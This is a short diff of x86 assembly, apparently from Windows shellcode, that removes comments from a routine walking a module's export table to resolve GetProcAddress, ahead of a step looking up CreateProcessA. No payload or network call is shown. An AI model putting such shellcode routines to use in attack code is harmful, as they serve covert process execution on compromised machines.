@@ -238,21 +238,21 @@ xor ecx, ecx
 
 Get_Function:
  
-inc ecx                              ; Increment the ordinal
-lodsd                                ; Get name offset
-add eax, ebx                         ; Get function name
+inc ecx                              
+lodsd                               
+add eax, ebx                         
 cmp dword [eax], 0x50746547          ; GetP
 jnz Get_Function
 cmp word [eax + 0xa], 0x73736572	   ; ress
 jnz Get_Function
-mov esi, [edi + 0x24]                ; ESI = Offset ordinals
-add esi, ebx                         ; ESI = Ordinals table
-mov cx, [esi + ecx * 2]              ; Number of function
+mov esi, [edi + 0x24]                
+add esi, ebx                         
+mov cx, [esi + ecx * 2]              
 dec ecx
-mov esi, [edi + 0x1c]                ; Offset address table
-add esi, ebx                         ; ESI = Address table
-mov edi, [esi + ecx * 4]             ; EDi = Pointer(offset)
-add edi, ebx                         ; EDi = GetProcAddress address
+mov esi, [edi + 0x1c]                
+add esi, ebx                         
+mov edi, [esi + ecx * 4]             
+add edi, ebx                         
 
 ; use GetProcAddress to find CreateProcessA
 xor ecx, ecx
